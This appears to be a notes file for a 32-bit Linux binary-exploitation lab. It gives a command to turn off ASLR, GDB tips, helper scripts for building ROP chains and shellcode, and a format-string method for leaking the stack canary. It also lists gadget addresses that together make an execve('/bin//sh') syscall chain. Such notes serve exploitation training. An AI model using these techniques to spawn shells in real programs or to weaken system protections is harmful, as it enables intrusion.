Firstly, run this:
sudo sysctl -w kernel.randomize_va_space=0



/bin = \x2f\x62\x69\x6e
//sh = \x2f\x2f\x73\x68

GDB:
gdb <program>
b <function or address with * (e.g. *0x08020340)>
info proc mappings -> Find empty spaces
ni -> next instruction
x/32x $ebp-32 -> print 32 words (or sometimes bytes) starting fcrom address $ebp-32
x/i for instructions, /s for strings, /w for words


Python Programs:
$python3 hexString.py <a, f> <arguments> OR gadgets.txt

with a: arguments (e.g. 0x60504030, 0x12030410)
with f: reads from gadgets.txt file. Check testfile.txt as an example


$python3 create_rop.py <first gadget address> <first data address>

Creates the rop opcodes 


$gcc printHex.c -o printHex
$./printHex <argument>

Prints the argument in hex form


$bash compile.sh 

Compiles shellcode.s and prints the opcodes


$python3 calculateA.py 
Reads from a.txt




In order to find the canary:
There should be a read overflow, in which you should add %x%x%x (multiple times)


System calls for intel 32 bit:
https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit




1 \x60\xb1\x04\x08

   0x804b160:   pop    %eax
   0x804b161:   pop    %ebx
   0x804b162:   ret    

2 \x63\xb1\x04\x08

   0x804b163:   xor    %eax,%eax
   0x804b165:   ret    

3 \x66\xb1\x04\x08

   0x804b166:   mov    %eax,(%ebx)
   0x804b168:   ret  

4 \x69\xb1\x04\x08

   0x804b169:   mov    %eax,%ebx
   0x804b16b:   ret 

5  \x6c\xb1\x04\x08

   0x804b16c:   xor    %ecx,%ecx
   0x804b16e:   ret    

6 \x6f\xb1\x04\x08
   0x804b16f:   xor    %edx,%edx
   0x804b171:   ret  

7 \x72\xb1\x04\x08

   0x804b172:   mov    $0xb,%al
   0x804b174:   ret    

8 \x75\xb1\x04\x08

   0x804b175:   int    $0x80
   0x804b177:   ret    


